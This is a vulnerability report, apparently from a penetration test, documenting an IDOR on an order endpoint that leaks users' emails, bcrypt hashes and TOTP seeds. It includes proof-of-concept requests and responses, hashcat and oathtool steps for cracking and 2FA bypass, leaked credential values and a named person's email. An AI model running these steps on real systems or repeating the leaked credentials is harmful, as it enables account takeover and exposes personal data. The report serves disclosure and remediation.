# Horizontal IDOR on GET /orders/{id} exposes any user's email, bcrypt password hash, TOTP secret, and admin flag

**ID:** vuln-0003
**Severity:** HIGH
**Found:** 2026-07-20 11:43:56 UTC
**Target:** https://api.taintedport.com
**Endpoint:** /orders/{id}
**Method:** GET
**CWE:** CWE-639
**CVSS:** 7.7 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N)

## Description

The order-detail endpoint `GET /orders/{id}` performs no object-level authorization check. Any authenticated caller — including a freshly self-registered attacker — can retrieve any order in the system by iterating its numeric identifier, and the response body embeds sensitive owner fields (`owner_name`, `owner_email`, `owner_password_hash`, `owner_totp_secret`, `owner_is_admin`) that belong to the order's actual owner rather than the caller.

Order identifiers are strictly sequential auto-increment integers, self-registration is open (no email verification, no CAPTCHA, no rate-limiting observed for 100+ back-to-back requests), and the only precondition for exploitation is possession of any valid bearer token — which an unauthenticated attacker can mint in a single request. Enumerating the id space therefore yields the bcrypt password hash of every user who has ever placed an order, together with the base32 TOTP secret of every 2FA-enabled account. Independent testing confirmed both leak vectors: order id 119 disclosed the hash and TOTP seed of user 373 (`luis.grangeia@snyk.io`), while order id 17 disclosed the hash and TOTP seed of the 2FA-enabled fixture user 28. Control requests (`/orders/9999999` → 404, `/orders/119` without a token → 401) confirm that authentication is enforced and that the row-not-found path is distinct from the row-disclosed path, so the leak is unambiguously an authorization failure rather than an error-page artefact.

Two independent security failures compound:
1. **CWE-639 — Broken Object Level Authorization.** The SQL query resolving the requested order is not scoped by `WHERE user_id = <jwt.user_id>`, and no post-fetch ownership check is applied.
2. **CWE-200 — Excessive data exposure.** The response serializer projects internal `users`-table columns (`password_hash`, `totp_secret`, `is_admin`) into the order payload as `owner_*` fields. These have no legitimate purpose in a customer-facing order response even for the correct owner.

## Attack Flow

```
┌──────────────────────────────────────────────────────────────────────┐
│         HORIZONTAL IDOR — GET /orders/{id}  (CWE-639 + CWE-200)      │
└──────────────────────────────────────────────────────────────────────┘

  Prerequisites:
    • Open self-registration (no email verification, no CAPTCHA)
    • Order ids are sequential auto-increment integers
    • No per-request ownership check in the /orders/{id} handler
    • No rate limiting on /orders/{id}

  ┌───────────┐                              ┌──────────────────────────┐
  │  Attacker │                              │   api.taintedport.com    │
  │ (no acct) │                              │  ┌────────────────────┐  │
  └─────┬─────┘                              │  │ orders table       │  │
        │                                    │  │  id, user_id, …    │  │
        │  [1] POST /auth/register           │  └────────┬───────────┘  │
        │      {name,email,password}         │           │ JOIN users   │
        │───────────────────────────────────▶│           ▼              │
        │◀───── 200 {token, user_id=421} ────│  ┌────────────────────┐  │
        │                                    │  │ users table        │  │
        │                                    │  │  email,            │  │
        │                                    │  │  password_hash,    │  │
        │                                    │  │  totp_secret,      │  │
        │                                    │  │  is_admin          │  │
        │                                    │  └────────────────────┘  │
        │                                    └──────────────────────────┘
        │
        │  [2] GET /orders/119                (attacker JWT: user_id=421)
        │      Authorization: Bearer <attacker>
        │───────────────────────────────────────────────▶
        │
        │            ┌────────────────────────────────┐
        │            │ Handler:                       │
        │            │   SELECT * FROM orders o       │
        │            │   JOIN users u ON o.user_id=u.id
        │            │   WHERE o.id = :id             │
        │            │   ↑ no AND o.user_id=:caller   │
        │            │   ↑ no ownership check         │
        │            └────────────────────────────────┘
        │
        │◀────── 200 OK ──────────────────────────────────
        │        {
        │          "user_id": 373,                  ← belongs to victim
        │          "owner_email": "luis.grangeia@snyk.io",
        │          "owner_password_hash": "$2y$10$UaebUU1lw…",  ⚠ bcrypt
        │          "owner_totp_secret":  "JBSWY3DPEHPK3PXP",    ⚠ 2FA seed
        │          "owner_is_admin":     0
        │        }
        │
        │  [3] Loop id = 1..N  →  harvest every user's hash + TOTP + admin
        │
        ▼
  ┌───────────────────────────────────────────────────────────────┐
  │ OFFLINE                                                       │
  │  • hashcat -m 3200 against bcrypt hashes → password cracking  │
  │  • oathtool --totp -b <base32 seed>       → live 2FA bypass   │
  │  • filter owner_is_admin=1                → target admins     │
  └───────────────────────────────────────────────────────────────┘

  Controls (proving this is authorization, not error handling):
      GET /orders/9999999           → 404  "Order not found."
      GET /orders/119 (no token)    → 401  "Access denied. No token provided."

  Root cause (one line):
      /orders/{id} handler filters by id alone, and joins users.*
      into the response as owner_* — including password_hash, totp_secret,
      and is_admin.
```

## Impact

An unauthenticated network attacker can, in a single-digit number of minutes, exfiltrate cross-account credential material for every customer who has ever placed an order:

- **Offline password cracking of the entire customer base** — the bcrypt `$2y$10$…` hash of every order-owner is disclosed verbatim, feeding directly into hashcat/john dictionary and mask attacks against weak or reused passwords.
- **Two-factor authentication bypass** — for every 2FA-enabled victim, the raw base32 TOTP seed is returned in the response, allowing the attacker to generate valid 6-digit codes at will and defeat the app's MFA layer.
- **Admin discovery and pre-positioning** — the `owner_is_admin` flag disclosed on every response makes it possible to identify privileged accounts with a single enumeration pass. Any admin who has placed or later places an order immediately becomes a high-value target whose hash + TOTP seed can be lifted and cracked offline — a direct path to full administrative takeover of the platform.
- **Personal data / regulatory exposure** — the full name and login email of every customer are exfiltrable at scale, constituting a bulk PII breach under GDPR.

During validation, a single 20-request scan by a net-new user harvested 20 bcrypt hashes and one live base32 TOTP seed across four distinct victim accounts. The identifier space is small, sequential, and unbounded, so the whole customer database is reachable in a linear scan.

## Technical Analysis

Root cause is a missing WHERE clause in the order-detail data-access path combined with a serializer that joins the owning user row into the response.

1. **Missing object-level authorization (BOLA / CWE-639).** The handler for `GET /orders/{id}` looks up the row by the path parameter alone. There is no `AND user_id = :caller_id` predicate, no post-fetch ownership check, and no role branch (admin vs. owner). Any bearer token that authenticates successfully is treated as authorised to read any row.

2. **Sensitive column projection (CWE-200).** The response is built from a JOIN across `orders` and `users`, and the users columns `password_hash`, `totp_secret`, and `is_admin` are surfaced as `owner_password_hash`, `owner_totp_secret`, and `owner_is_admin` — apparently because the checkout UI uses `owner_name`/`owner_email` to render "Your Order" and the whole owner row was pulled in as a convenience. There is no output DTO / allow-list; adding columns to `users` will automatically leak them here.

3. **No compensating controls.** Authentication is enforced (401 without a token) and the row-not-found path is honest (404 for out-of-range ids), so the 200 responses observed for arbitrary ids are unambiguously the result of the missing authorization check. Registration is open and rate limiting was not observed for 100+ back-to-back requests, so the "any authenticated caller" precondition is effectively equivalent to "any network attacker".

4. **Enumeration is trivial.** Order ids are sequential auto-increment integers, so a simple `for id in range(1, N)` linear scan reaches every row; no side-channel or discovery step is needed.

Reproduction was performed with a fresh account created solely for validation (user_id 421 / 430 / 431 across runs), and the leaked material for orders 1, 17, and 119 belongs to unrelated user_ids 1, 28, and 373 respectively.

## Proof of Concept

1. Register a fresh attacker account with `POST /auth/register {"name":"…","email":"…","password":"…"}`; the response returns a JWT immediately (no email verification).
2. As that attacker, request an arbitrary order id you do not own: `GET /orders/119` with `Authorization: Bearer <token>`.
3. Observe HTTP 200 with a body that includes `"user_id":373`, `"owner_email":"luis.grangeia@snyk.io"`, `"owner_password_hash":"$2y$10$UaebUU1lw…"`, `"owner_totp_secret":"JBSWY3DPEHPK3PXP"`, `"owner_is_admin":0`.
4. Repeat for other ids (e.g. `/orders/17` returns the TOTP-enabled fixture user's seed `J24ZJCUQDVK47IKELZ6AZ2FHLHD7KQSJ` and its bcrypt hash). Any `id` value in the auto-increment range yields the corresponding owner's credential material.
5. Confirm the controls: `/orders/9999999` returns 404 ("Order not found."), and the same request without an `Authorization` header returns 401 ("Access denied. No token provided."). These prove the 200 responses are authorization failures rather than error-page or wildcard behaviour.

The bundled PoC script (`poc.py`) automates steps 1–4, prints coloured evidence, and saves the disclosed rows to `evidence/disclosed_orders.json`. `verify.py` is a minimal boolean regression test that exits 0 while the endpoint remains vulnerable and 1 once ownership is enforced.

```
# See poc_script_path — full PoC lives in /workspace/validation/idor-orders-detail/poc/poc.py
```

## Evidence

### 1. Self-register a fresh attacker (no prior standing, no email verification)

**Request:**
```http
POST /auth/register HTTP/1.1
Host: api.taintedport.com
Content-Type: application/json

{"name":"ValidatorTest2","email":"validator2-1784547529@example.com","password":"Validate!2test-99"}
```

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"message":"User registered successfully","token":"eyJhbGciOiJIUzI1NiIs...user_id=421...","user":{"id":421,"name":"ValidatorTest2","email":"validator2-1784547529@example.com","is_admin":false}}
```

> Registration is open and returns a usable JWT immediately, giving the attacker the low-privileged bearer needed for step 2.

### 2. Attacker (user_id=421) requests order id=119 owned by user_id=373

**Request:**
```http
GET /orders/119 HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...user_id=421...
```

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"order":{"id":119,"user_id":373,"total":1,"status":"pending","shipping_name":"Recon","shipping_city":"Lisboa","created_at":"2026-07-20 11:25:10","owner_name":"Luis Grangeia","owner_email":"luis.grangeia@snyk.io","owner_password_hash":"$2y$10$UaebUU1lw.Wy0MTZMp1pkOMS1zdr/Ve51KvR4HoFavuaMRHWf8eqK","owner_totp_secret":"JBSWY3DPEHPK3PXP","owner_is_admin":0,"items":[...]}}
```

> Attacker's JWT (user_id=421) is used to read an order whose owner is user_id=373. The response body includes the owner's bcrypt password hash and base32 TOTP secret — credential material that has no legitimate place in an order response.

### 3. Same attacker reads order id=17 belonging to the TOTP-enabled test user (user_id=28)

**Request:**
```http
GET /orders/17 HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer <attacker-token>
```

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"order":{"id":17,"user_id":28,"owner_email":"totpvictim_infodisclosure@taintedport.test","owner_password_hash":"$2y$10$zPbVF6Eof060W.C58F4P/e...","owner_totp_secret":"J24ZJCUQDVK47IKELZ6AZ2FHLHD7KQSJ","owner_is_admin":0}}
```

> A second victim account with 2FA enabled — the base32 seed leaks in full, allowing the attacker to derive valid 6-digit TOTP codes at any time. Every 200 for a non-owned order id is a full credential disclosure event.

### 4. Control — non-existent id returns 404 (proves 200 leaks are authorization-based, not error-based)

**Request:**
```http
GET /orders/9999999 HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer <attacker-token>
```

**Response:**
```http
HTTP/1.1 404 Not Found
Content-Type: application/json

{"success":false,"message":"Order not found."}
```

> The endpoint DOES distinguish 'row does not exist' (404) from 'row exists' (200), so the 200 responses in steps 2 and 3 are unambiguously authorization failures.

### 5. Control — unauthenticated request is rejected (confirms 200 requires auth)

**Request:**
```http
GET /orders/119 HTTP/1.1
Host: api.taintedport.com
```

**Response:**
```http
HTTP/1.1 401 Unauthorized
Content-Type: application/json

{"success":false,"message":"Access denied. No token provided."}
```

> Authentication IS enforced; only object-level authorization is missing — the classic BOLA / horizontal IDOR pattern.


## Remediation

1. **Enforce object-level authorization on `GET /orders/{id}`.** Reject any request whose JWT `user_id` does not match the row's `user_id` (unless the caller has `is_admin=true`). Prefer query-scoping so a non-owner cannot even distinguish "wrong owner" from "not found": `SELECT * FROM orders WHERE id = :id AND (user_id = :caller_id OR :caller_is_admin)`. Return 404 (not 403) for the negative case to avoid confirming id existence.

2. **Stop leaking credential material in API responses.** Remove `owner_password_hash`, `owner_totp_secret`, and `owner_is_admin` from every order response body — they have no client-side use even for the legitimate owner. Restrict the customer-facing payload to display-only fields (e.g. `owner_name`, and only to the owner or an admin).

3. **Introduce an explicit output DTO / serializer allow-list** for the order resource, driven by a whitelist of columns rather than a `SELECT * … JOIN users`. Any future column added to `users` will then not be exfiltrated automatically.

4. **Replace sequential integer ids with unguessable identifiers** (UUIDv4 or signed opaque ids) so that even if the authorization bug regresses, enumeration is no longer a straight `for id in 1..N`.

5. **Rate-limit `/orders/{id}` per authenticated principal** (e.g. 30 rpm/user) and alert on high 2xx-ratio scans of the endpoint.

6. **Audit adjacent endpoints** that follow the same pattern for owner-scoped reads — `GET /wines/{id}/reviews/{review_id}`, `GET /admin/orders/{id}`, and any other resource that ships an `owner_*` blob — for the same missing authorization check and the same credential-column exposure.

7. **Add regression coverage** for two invariants: (a) a user who does not own an order receives 404, and (b) no order response body ever contains the substrings `password_hash` or `totp_secret`.

8. **Rotate credentials for exposed users.** Every bcrypt hash and TOTP seed reachable via `/orders/{id}` should be treated as compromised: force a password reset for all affected accounts and re-provision TOTP secrets for every 2FA-enabled user whose seed may have been disclosed.

## Conditions for Severity Increase

If any admin user has placed or later places an order — or if an attacker successfully cracks the bcrypt hash of any user later promoted to admin — enumeration of `/orders/{id}` immediately yields that admin's password hash, TOTP seed, and `is_admin=1` flag. Once cracked offline, this is a direct path to full administrative takeover: Integrity and Availability both rise to H, changing CVSS 3.1 to AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H = 9.9 CRITICAL. The escalation is entirely operational — no code change is required for it to occur, only a single admin order placement.
